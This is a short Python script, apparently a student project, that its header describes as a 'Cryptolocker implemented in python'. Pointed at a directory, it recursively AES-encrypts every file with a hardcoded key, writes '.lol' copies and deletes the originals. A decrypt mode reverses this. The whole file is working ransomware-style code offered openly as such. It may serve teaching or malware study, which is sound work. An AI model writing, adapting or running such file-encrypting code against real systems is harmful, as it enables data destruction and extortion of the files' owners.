#!/usr/bin/env python
import shutil
from sys import argv
from os import walk, remove
from Crypto import Random
from Crypto.Cipher import AES

###
# Author: Michael Salsone (mas9190@rit.edu)
# Cryptolocker implemented in python. When pointed at a directory, will
# recursively encrypt all files in that directory with AES128.
# Usage: ./pylocker <Absolute Path> <anything here will force decrypt>
###

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=128):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".lol", 'wb') as fo:
		fo.write(enc)

def decrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)

def main():
	key = b'sixteenbytekeyzz'
	mypath = argv[1]
	encryption_flag = True

	if len(argv) == 3:
		encryption_flag = False

	for (dirpath, dirnames, filenames) in walk(mypath): 
		for files in filenames:
			en_file = dirpath + "/" + files
			if encryption_flag == True:
				encrypt_file(en_file, key)
				shutil.copystat(en_file, en_file + ".lol")
				remove(en_file)
			else:
				decrypt_file(en_file, key)
				shutil.copystat(en_file, en_file[:-4])
				remove(en_file)

if __name__ == "__main__":
    main()
